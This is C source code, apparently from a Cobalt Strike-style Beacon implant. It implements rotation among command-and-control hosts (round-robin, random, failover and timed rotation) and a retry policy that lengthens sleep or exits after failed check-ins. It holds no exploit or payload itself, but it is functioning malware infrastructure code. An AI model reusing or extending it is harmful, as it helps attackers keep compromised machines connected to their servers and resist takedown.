/* 用于获取和设置Beacon设置的API */
#include <Windows.h>
#include <stdlib.h>
#include "parse.h"
#include "beacon.h"
#include "strategy.h"
#include <time.h>

/*
* CS-31: 主机/域名轮换策略
* 在CS-31之前，主机轮换始终/仅使用'轮询'方式。
*
* 主机/域名轮换策略：
*    - round-robin（轮询）
*    - random（随机）
*    - failover（故障转移）      [在每次检查失败后轮换 - 只要主机正常工作就继续使用...]
*    - failover-[数字]x          ["failover-77x" = 在连续77次检查失败后进行故障转移]
*    - failover-[数字][s/m/h/d]  ["failover-77m" = 在77分钟的检查失败后进行故障转移]
*    - rotate-[数字][s/m/h/d]    ["rotate-77m" = 每77分钟轮换一次]
*
* 不支持的策略：
*    - rotate                     [如果支持，"rotate-0x"和"rotate-0s"将与'轮询'功能相同]
*    - rotate-[数字]x            [TODO: 这很容易实现，但是有用吗？]
*/

void strategy_setup(strategy_info * si, int strategy, int rotation_timer, int failover_timer, int failover_maxfail) {
	// dlog("strategy.strategy_setup - Strategy Initialization started: strategy: '%d' rotation_timer: '%d' failover_timer: '%d' failover_maxfail: '%d' \n", strategy, rotation_timer, failover_timer, failover_maxfail);
	si->strategy = strategy;
	si->rotation_timer = rotation_timer;
	si->failover_timer = failover_timer;
	si->failover_maxfail = failover_maxfail;
	// dlog("strategy.strategy_setup - Strategy Initialization finished: strategy: '%d' rotation_timer: '%d' failover_timer: '%d' failover_maxfail: '%d' \n", si->strategy, si->rotation_timer, si->failover_timer, si->failover_maxfail);
}

/*
* 主机/域名轮换的轮询策略实现
*/
char * next_host_round_robin(char * hosts) {
	static char * token = NULL;
	char * ptr;
	if (token == NULL) {
		token = (char *)malloc(strlen(hosts) + 1);   /* TODO: allocates a buffer to loop through a set of hosts, not released on exit, mask candidate : currently no good access to it.*/
		strncpy(token, hosts, strlen(hosts) + 1);
		return strtok(token, ",");
	}
	else {
		ptr = strtok(NULL, ",");
		if (ptr == NULL) {
			free(token);
			token = NULL;
			return next_host_round_robin(hosts);
		}
		else {
			return ptr;
		}
	}
}

/*
* 在指定范围内生成随机数（基于可用主机数量）
*/
int randomInRange(int min, int max) {
	return (rand() % (max - min + 1)) + min;
}

/*
* 用于将成对数组项的随机索引号转换为对中第一项的编号。
*    随机数 0,1  返回 0
*    随机数 2,3  返回 2
*    随机数 4,5  返回 4...
*/
int evenNumber(int number) {
	int evenNumber = number - ((number) % 2);
	// dlog("strategy.evenNumber - Input: %d evenNumber: %d \n", number, evenNumber);
	return evenNumber;
}

/*
* 主机/域名轮换的随机策略实现
*/
char * next_host_random(char * hosts) {
	static char * hs = NULL;
	static char *tokens[200];
	static int tokenCount;
	static int tokenIndex;

	char * token;

	if (hs == NULL) {
		hs = (char *)malloc(strlen(hosts) + 1);  /* TODO: not cleaned up on exit, mask candidate : currently no good access to it.*/
		strncpy(hs, hosts, strlen(hosts) + 1);

		tokenCount = 0;
		token = strtok(hs, ",");
		while (token != NULL) {
			tokens[tokenCount++] = token;
			token = strtok(NULL, ",");
		}

		// Set token index to random...
		tokenIndex = -1;
	}

	// New token index number?
	if (tokenIndex < 0 || tokenIndex >= tokenCount) {
		tokenIndex = evenNumber(randomInRange(0, tokenCount - 1));
		// dlog("strategy.next_host_random - Random Token Index: %d \n", tokenIndex);
		// Hosts will be at even number index entries: tokens[0,2,4,6,8...]
		return tokens[tokenIndex];
	}
	else {
		// URI is at following even number array positions: tokens[1,3,5,7,9...]
		int x = tokenIndex + 1;
		tokenIndex = -1;
		// dlog("strategy.next_host_random - URI Index: %d \n", x);
		return tokens[x];
	}
}

/*
* 主机/域名轮换的轮转策略实现
* ------------------------------------------------------------
* 这将返回相同的主机/URI对，直到检测到过期或故障转移，
*  - 然后移动到下一个主机/URI，直到过期或故障转移...
*  - 然后移动到下一个主机/URI，直到过期或故障转移...
*  - 然后移动到下一个主机/URI，直到过期或故障转移...
*  - 然后移动到下一个主机/URI，直到过期或故障转移...
*  - ... 明白了吗？
* 到达列表末尾时将重置...
* --------------------------------------------------------------
*/
char * next_host_priority_failover(char * hosts, BOOL lastCheckinFailed, strategy_info * si) {

	static char * hs = NULL;
	static char *tokens[200];
	static int tokenCount;
	static int tokenIndex;
	static int uriOffset = 0;
	static int failedCount = 0;
	static time_t startTime;
	static int max_time_seconds = -1;
	static int max_fail_seconds = -1;
	static int max_fail_times = -1;
	static time_t fail_window_start;

	char * token;

	BOOL expired = FALSE;
	time_t now = time(NULL);

	// First pass? Load static fields...
	if (hs == NULL) {
		// dlog("strategy.next_host_priority_failover - lastCheckinFailed: %s rotation_timer: %d failover_timer: %d failover_maxfail: %d Hosts: %s \n", lastCheckinFailed ? "true" : "false", si->rotation_timer, si->failover_timer, si->failover_maxfail, hosts);

		hs = (char *)malloc(strlen(hosts) + 1);  /* TODO: not cleaned up on exit, mask candidate : currently no good access to it. */
		strncpy(hs, hosts, strlen(hosts) + 1);

		tokenCount = 0;
		token = strtok(hs, ",");
		while (token != NULL) {
			tokens[tokenCount++] = token;
			token = strtok(NULL, ",");
		}

		// After loading tokens array...
		//   tokens[0]   = host1
		//   tokens[1]   = /uri
		//   tokens[2]   = host2
		//   tokens[3]   = /uri
		//   tokens[...] = ...

		// Set token index to first host/uri token(s)...
		tokenIndex = 0;

		startTime = time(NULL);
		fail_window_start = 0;

		// Rotation based on duration.
		// How long should a host be used before rotation? (failures not considered)
		//   -1 = disabled/off
		//   0 = rotate after every use (may not be available in UI)
		//   1 or more = number of seconds to use a host before rotation occurs.
		max_time_seconds = si->rotation_timer;

		// Rotation based on failed occurances (how many retries before rotation)
		//   -1 = disabled/off
		//   0 = rotate after every failure
		//   1 or more = number of consecutive failure retries before rotation occurs
		max_fail_times = si->failover_maxfail;

		// Rotation based on duration.  How long should a host be used before rotation. (failures not considered)
		// -1 = disabled/off
		// 0 = rotate after every use (may not be available in UI)
		// 1 or more = number of seconds to use a host before rotation occurs.
		max_fail_seconds = si->failover_timer;

		// dlog("strategy.next_host_priority_failover - max_time_seconds: %d max_fail_seconds: %d max_fail_times: %d \n", max_time_seconds, max_fail_seconds, max_fail_times);
	}

	// Should we advance to the next host/uri pair?
	if (lastCheckinFailed) {
		// Have we reached a failure limit? Force expiration of the host.
		if (max_fail_times > -1) {
			failedCount++;
			if (failedCount > max_fail_times) {
				expired = TRUE;
				// dlog("strategy.next_host_priority_failover - Failed count maximum reached. failedCount: %d max_fail_times: %d \n", failedCount, max_fail_times);
			}
			else {
				// dlog("strategy.next_host_priority_failover - Failed count maximum pending. failedCount: %d max_fail_times: %d \n", failedCount, max_fail_times);
			}
		}

		// Max failed minutes/hours/days window? Force expiration of the host.
		if (max_fail_seconds > -1) { // Are we checking a host failed window?
			if (fail_window_start != 0) { // Are we in a previously failed state?
				// we are in a failed window. Expire the host?
				if (now > (fail_window_start + max_fail_seconds)) {
					expired = TRUE;
					// dlog("strategy.next_host_priority_failover - Failed host window expired for index: %d \n", tokenIndex);
				}
				else {
					// dlog("strategy.next_host_priority_failover - Failed host window expiration time: %lld of %d seconds \n", ((fail_window_start + max_fail_seconds) - now), max_fail_seconds);
				}
			}
			else {
				// First failure. We are starting a new failed window!
				fail_window_start = time(NULL);
				// dlog("strategy.next_host_priority_failover - Failed host window starting: %lld of %d seconds \n", ((fail_window_start + max_fail_seconds) - now), max_fail_seconds);
			}
		}
	}
	else {
		// reset failed trackers if we are not in a failed state anymore...
		if (uriOffset == 0) {
			fail_window_start = 0;
			failedCount = 0;
		}
	}

	// Check for 'expired' host
	// only when getting the host - not when getting the URI
	if (max_time_seconds > -1) {
		if (!expired && (uriOffset == 0)) {
			if (now > (startTime + max_time_seconds)) {
				expired = TRUE;
				// dlog("strategy.next_host_priority_failover - Expired host rotation time for index: %d \n", tokenIndex);
			}
			else {
				// dlog("strategy.next_host_priority_failover - Remaining host rotation time: %lld of %d seconds \n", ((startTime + max_time_seconds) - now), max_time_seconds);
			}
		}
	}

	// Are we failed or expired? [move to the next host... Like the borg...]
	// tokenIndex for host names will be even number indexes [0,2,4,6,8...]
	if (expired) {
		expired = FALSE;
		failedCount = 0;
		uriOffset = 0;
		fail_window_start = 0;
		// Move to the next host/uri position.
		tokenIndex = tokenIndex + 2;
		// Are we at the end? Reset to the first host/uri pair
		if (tokenIndex >= tokenCount) {
			tokenIndex = 0;
		}
		// dlog("strategy.next_host_priority_failover - Expired/Failed Over To Index: %d \n", tokenIndex);
		startTime = time(NULL);
	}

	// Are we getting the Host name?
	if (uriOffset == 0) {
		// Set the URI flag ON for the next invocation
		uriOffset = 1;
		// Return the host name at even array index: tokens[0,2,4,6,8,...]
		// dlog("strategy.next_host_priority_failover - Returning Index: %d Host: %s \n", tokenIndex, tokens[tokenIndex]);
		return tokens[tokenIndex];
	}

	// Set the URI flag OFF for the next invocation
	uriOffset = 0;

	// Return the uri at odd number array index: tokens[1,3,5,7,9,...]
	// dlog("strategy.next_host_priority_failover - Returning Index: %d (+1) URI: %s \n", tokenIndex, tokens[tokenIndex + 1]);
	return tokens[tokenIndex + 1];
}

/*
* 获取下一个主机（或前一个主机的URI）
* ------------------------------------------------------------
* 'hosts'是一组以逗号分隔的"主机,uri"对。
* 'hosts' = "host1,/uri,host2,/uri,host3,/uri..."
* ------------------------------------------------------------
* 此方法成对调用以获取：
*    第一次调用：获取下一个主机。
*    第二次调用：获取该主机的URI。
*/
char * next_host(char * hosts, BOOL lastCheckinFailed, strategy_info * si) {
	char * host;

	// dlog("strategy.next_host - Getting Host: hosts: %s strategy: %d \n", hosts, si->strategy);
	if (si->strategy == HOST_STRATEGY_RANDOM) {
		host = next_host_random(hosts);
	}
	else if (si->strategy == HOST_STRATEGY_EVENT) {
		host = next_host_priority_failover(hosts, lastCheckinFailed, si);
	}
	else {
		// Should be processing: HOST_STRATEGY_ROUND_ROBIN [or undefined/default]
		host = next_host_round_robin(hosts);
	}
	// dlog("strategy.next_host - Returning host: %s \n", host);
	return host;
}

/*
*  检查最大重试策略以确定beacon是否应该退出或增加休眠时间。
*  当前状态由maxRetryCount、sleep_time和maxOrigSleepTime
*  变量跟踪。如果进行了更改，调用者将看到更新后的值。
*
*  当failedHost为TRUE时，跟踪的变量将被重置。
*  
*  返回值：
*    FALSE - beacon应继续运行。跟踪的变量已更新
*    TRUE  - beacon应退出，因为已达到最大失败连接尝试次数。
*/
BOOL check_max_retry(BOOL failedHost, int * maxRetryCount, unsigned int * sleep_time, unsigned int * maxOrigSleepTime) {
	int maxRetryAttempts = setting_int(SETTING_MAX_RETRY_STRATEGY_ATTEMPTS);
	int maxRetryIncrease = setting_int(SETTING_MAX_RETRY_STRATEGY_INCREASE);
	int maxRetryDuration = setting_int(SETTING_MAX_RETRY_STRATEGY_DURATION);

	/* 检查最大重试策略 */
	if (maxRetryAttempts > 0) {
		if (failedHost == TRUE) {
			(*maxRetryCount)++;
			if (*maxRetryCount >= maxRetryIncrease && *maxOrigSleepTime == 0) {
				*maxOrigSleepTime = *sleep_time;
				if (*sleep_time < maxRetryDuration * 1000) {
					*sleep_time = maxRetryDuration * 1000;
				}
			}
			if (*maxRetryCount >= maxRetryAttempts) {
				return TRUE;
			}
		}
		else if (*maxRetryCount > 0) {
			*maxRetryCount = 0;
			if (*maxOrigSleepTime > 0) {
				*sleep_time = *maxOrigSleepTime;
				*maxOrigSleepTime = 0;
			}
		}
	}

	return FALSE;
}

